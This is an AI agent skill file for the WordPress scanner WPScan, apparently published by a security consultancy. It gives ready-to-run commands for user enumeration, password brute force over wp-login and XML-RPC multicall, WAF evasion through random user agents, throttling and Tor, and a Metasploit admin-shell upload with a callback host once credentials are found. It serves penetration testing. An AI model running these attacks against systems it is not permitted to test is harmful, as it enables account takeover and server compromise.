---
name: wpscan
description: >
  Build, extend, and operate WPScan — a WordPress security scanner for identifying
  vulnerabilities in WordPress installations, themes, and plugins. Use when the user
  asks about WPScan, WordPress enumeration, plugin/theme vulnerability scanning,
  WordPress brute force, xmlrpc exploitation, WordPress REST API enumeration, or
  automated WordPress security assessments. Covers installation, API token setup,
  all enumeration modes, detection strategies, brute force, output formats, stealthy
  scanning, vulnerability database integration, and full WordPress assessment workflow.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/wpscanteam/wpscan
---

# wpscan Agent Skill

## When to Use This Skill

Use this skill when:
- The user is assessing a WordPress installation during a web application pentest
- Enumerating WordPress users, plugins, themes, or configuration issues
- Brute-forcing WordPress credentials (wp-admin or xmlrpc)
- Checking for CVEs in installed plugins and themes
- The user needs to identify the WordPress version, backup files, or sensitive paths
- Automating WordPress security assessments in a pipeline

## What WPScan Does

WPScan is the industry-standard WordPress security scanner, written in Ruby and maintained by
the WPScan team. It identifies WordPress version, installed plugins (including vulnerable ones),
themes, users, and common misconfigurations. It integrates with the WPScan Vulnerability
Database (WPVDB) to report CVEs for identified components. WPScan supports passive, mixed,
and aggressive detection modes, making it suitable for both stealthy recon and thorough
vulnerability identification. It is pre-installed on Kali Linux and available via Docker.

## Installation

```bash
# Kali Linux (pre-installed, update with)
sudo apt update && sudo apt install wpscan -y

# RubyGems
gem install wpscan

# From source
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
bundle install
ruby wpscan.rb --help

# Docker
docker pull wpscanteam/wpscan
docker run -it --rm wpscanteam/wpscan --url https://target.com --api-token TOKEN

# Update vulnerability database
wpscan --update
```

## API Token Setup

WPScan requires a free API token for vulnerability data (CVE lookups). Without it, only
version and component detection works — no CVE data.

```bash
# Register at: https://wpscan.com/register (free tier: 25 API calls/day)
# Set token in config file:
mkdir -p ~/.wpscan
cat > ~/.wpscan/scan.yml << 'EOF'
cli_options:
  api_token: YOUR_TOKEN_HERE
EOF

# Or pass per-run:
wpscan --url https://target.com --api-token YOUR_TOKEN_HERE

# Check remaining API credits
wpscan --api-token YOUR_TOKEN --url https://target.com 2>&1 | grep "API calls"
```

## Core Concepts

### Detection Modes

| Mode | Description | Noise Level |
|------|-------------|-------------|
| `passive` | Only reads what's visible in page source and HTTP headers | Minimal |
| `aggressive` | Active probing, directory brute-force, direct file checks | High |
| `mixed` | Passive first, then aggressive where passive finds components | Medium |

Detection mode applies to plugins, themes, and timthumbs separately:
```bash
--plugins-detection passive|aggressive|mixed
--themes-detection passive|aggressive|mixed
--timthumbs-detection passive|aggressive|mixed
```

### Enumeration Modes (-e)

| Flag | Scope |
|------|-------|
| `vp` | Vulnerable plugins only |
| `ap` | All plugins (slower, more complete) |
| `p` | Popular plugins only |
| `vt` | Vulnerable themes only |
| `at` | All themes |
| `t` | Popular themes |
| `tt` | Timthumbs |
| `cb` | Config backups |
| `dbe` | DB exports |
| `u` | Users (default range 1-10) |
| `m` | Media (enumerate media IDs) |

Combine enumeration modes:
```bash
wpscan --url https://target.com -e vp,vt,u,cb,dbe
```

## CLI Reference

### Basic Scan

```bash
# Default scan (version detection, interesting findings)
wpscan --url https://target.com

# With API token
wpscan --url https://target.com --api-token YOUR_TOKEN

# Verbose output
wpscan --url https://target.com -v

# Disable SSL certificate check (self-signed certs)
wpscan --url https://target.com --disable-tls-checks
```

### Plugin Enumeration

```bash
# Enumerate all vulnerable plugins
wpscan --url https://target.com -e vp --api-token YOUR_TOKEN

# Enumerate ALL plugins (comprehensive, slow ~1500 checks)
wpscan --url https://target.com -e ap --plugins-detection aggressive --api-token YOUR_TOKEN

# Popular plugins only (faster)
wpscan --url https://target.com -e p --plugins-detection mixed --api-token YOUR_TOKEN
```

### Theme Enumeration

```bash
# All vulnerable themes
wpscan --url https://target.com -e vt --api-token YOUR_TOKEN

# All themes (aggressive detection)
wpscan --url https://target.com -e at --themes-detection aggressive --api-token YOUR_TOKEN
```

### User Enumeration

```bash
# Default user enumeration (IDs 1-10)
wpscan --url https://target.com -e u

# Expand user ID range
wpscan --url https://target.com -e u1-100

# Author archive method (different technique, often works when IDs are blocked)
wpscan --url https://target.com --enumerate u --plugins-version-detection passive

# REST API user enumeration
wpscan --url https://target.com --enumerate u
# WPScan checks: /wp-json/wp/v2/users automatically
```

### Brute Force

```bash
# Password brute force for discovered users
wpscan --url https://target.com -e u --passwords /usr/share/wordlists/rockyou.txt

# Single user + wordlist
wpscan --url https://target.com --usernames admin --passwords passwords.txt

# Multiple usernames
wpscan --url https://target.com --usernames admin,editor,subscriber \
  --passwords /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Via xmlrpc (faster, allows multicall)
wpscan --url https://target.com --usernames admin \
  --passwords /path/to/wordlist.txt --password-attack xmlrpc

# Via wp-login (default)
wpscan --url https://target.com --usernames admin \
  --passwords wordlist.txt --password-attack wp-login

# Multicall (send multiple passwords per XML-RPC call — much faster if allowed)
wpscan --url https://target.com --usernames admin \
  --passwords wordlist.txt --password-attack xmlrpc-multicall

# Throttle requests to avoid lockout
wpscan --url https://target.com --usernames admin \
  --passwords wordlist.txt --throttle 2000   # 2000ms between requests
```

### Config Backup and DB Export Enumeration

```bash
# Check for config backups and DB exports
wpscan --url https://target.com -e cb,dbe

# Checks paths like:
# wp-config.php~, wp-config.bak, wp-config.php.bak
# *.sql, *.sql.gz, backup.sql, wp-backup.zip
```

### Comprehensive Enumeration

```bash
# Full assessment command
wpscan --url https://target.com \
  --api-token YOUR_TOKEN \
  -e ap,at,tt,cb,dbe,u \
  --plugins-detection aggressive \
  --themes-detection aggressive \
  --random-user-agent \
  --disable-tls-checks \
  -o /tmp/wpscan_results.txt \
  --format cli-no-colour
```

### Stealthy Scanning

```bash
# Random user agent per request
wpscan --url https://target.com --random-user-agent

# Specify custom user agent
wpscan --url https://target.com \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Throttle requests (milliseconds between requests)
wpscan --url https://target.com --throttle 3000

# Use passive detection only
wpscan --url https://target.com \
  -e vp,vt \
  --plugins-detection passive \
  --themes-detection passive

# Route through proxy
wpscan --url https://target.com --proxy http://127.0.0.1:8080
wpscan --url https://target.com --proxy socks5://127.0.0.1:9050  # Tor
```

### HTTP Authentication

```bash
# WordPress requires HTTP basic auth (staging sites, etc.)
wpscan --url https://target.com --http-auth admin:password

# WordPress application password (for authenticated scans)
wpscan --url https://target.com --wp-auth admin:app_password_here
```

### Output Formats

```bash
# JSON output (machine-readable)
wpscan --url https://target.com --api-token TOKEN -o /tmp/results.json --format json

# CLI (human-readable, default)
wpscan --url https://target.com -o /tmp/results.txt --format cli

# CLI without color (for log files)
wpscan --url https://target.com -o /tmp/results.txt --format cli-no-colour

# Parse JSON output with jq
jq '.interesting_findings[] | {title: .to_s, url: .url}' /tmp/results.json
jq '.plugins | to_entries[] | select(.value.vulnerabilities | length > 0)' /tmp/results.json
```

## Vulnerability Database Integration

WPScan checks installed components against WPVDB (https://wpscan.com/vulnerabilities):

```bash
# View local vulnerability database stats
ls ~/.wpscan/db/
# data_sources.json, wordpress.json, plugins/*.json, themes/*.json

# Manual update
wpscan --update

# Force update
wpscan --update --force

# Offline mode (use cached DB, no API call)
wpscan --url https://target.com --no-update --api-token TOKEN
```

Output for a vulnerable plugin looks like:

```
[!] Plugin: contact-form-7 2.3.1
 | Found By: Readme File
 | [!] 3 vulnerabilities identified:
 |  [!] CVE-2021-39439 - Stored XSS
 |      Fixed In: 5.5.0
 |      References: https://wpscan.com/vulnerability/abc123
```

## XML-RPC and REST API Testing

```bash
# WPScan auto-checks xmlrpc.php
# Manually verify:
curl -s https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# REST API user enumeration (check if exposed)
curl -s https://target.com/wp-json/wp/v2/users | jq '.[] | {id: .id, name: .name, slug: .slug}'

# REST API namespace discovery
curl -s https://target.com/wp-json/ | jq '.namespaces'

# Check if REST API is disabled (returns 404 or empty)
wpscan --url https://target.com -e u   # WPScan checks wp-json automatically
```

## Common Engagement Workflows

### Initial WordPress Fingerprint

```bash
# Quick fingerprint — version, users, obvious issues
wpscan --url https://target.com --api-token TOKEN -e u,vp,vt --random-user-agent
```

### Full Vulnerability Assessment

```bash
# Step 1: Full scan with all enumerations
wpscan --url https://target.com \
  --api-token YOUR_TOKEN \
  -e ap,at,cb,dbe,u1-50 \
  --plugins-detection aggressive \
  --themes-detection aggressive \
  --random-user-agent \
  --format json -o /tmp/wpscan_full.json

# Step 2: Parse for vulnerabilities
jq '.plugins | to_entries[] | select(.value.vulnerabilities | length > 0) |
    {plugin: .key, vulns: .value.vulnerabilities[].title}' /tmp/wpscan_full.json

# Step 3: Check for config backups
jq '.interesting_findings[] | select(.type == "backup_file") | .url' /tmp/wpscan_full.json
```

### Credential Brute Force After User Enumeration

```bash
# Step 1: Enumerate users
wpscan --url https://target.com -e u1-100 --random-user-agent \
  --format json -o /tmp/users.json

# Step 2: Extract usernames
jq -r '.users | to_entries[] | .value.username' /tmp/users.json > /tmp/wp_users.txt

# Step 3: Brute force
wpscan --url https://target.com \
  --usernames /tmp/wp_users.txt \
  --passwords /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
  --password-attack xmlrpc-multicall \
  --throttle 1000 \
  --random-user-agent
```

## Integration with Other Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept WPScan traffic, replay/modify requests manually |
| Metasploit | `exploit/unix/webapp/wp_admin_shell_upload` after getting creds |
| SQLMap | Test vulnerable plugin parameters identified by WPScan |
| Nikto | Complement WPScan for general web server issues |
| Hydra | Alternative brute force tool if WPScan is blocked |
| xmlrpc-brute (nmap) | Cross-check XML-RPC brute force results |

```bash
# After finding valid credentials, use Metasploit for shell
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set TARGETURI /wordpress/
set USERNAME admin
set PASSWORD FoundPassword1!
set LHOST 10.10.14.5
run
```

## Troubleshooting

**403 Forbidden / WAF blocking:**
```bash
# Use random user agent + throttle
wpscan --url https://target.com --random-user-agent --throttle 5000 --max-threads 1

# Route through Burp to identify blocked patterns
wpscan --url https://target.com --proxy http://127.0.0.1:8080
```

**SSL/TLS errors:**
```bash
wpscan --url https://target.com --disable-tls-checks
```

**No API token — limited results:**
```bash
# Register free token at https://wpscan.com/register
# 25 free API calls/day, 75/day on paid tier
```

**User enumeration returns no users:**
- Site may block `?author=1` redirects — try REST API manually
- `curl -s https://target.com/wp-json/wp/v2/users`
- Check if `oembed` endpoint leaks usernames

**"WordPress version could not be detected":**
- Generator tag may be removed — check `/wp-includes/js/wp-emoji-release.min.js` for version hint
- Compare `style.min.css` hashes against known version fingerprints
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
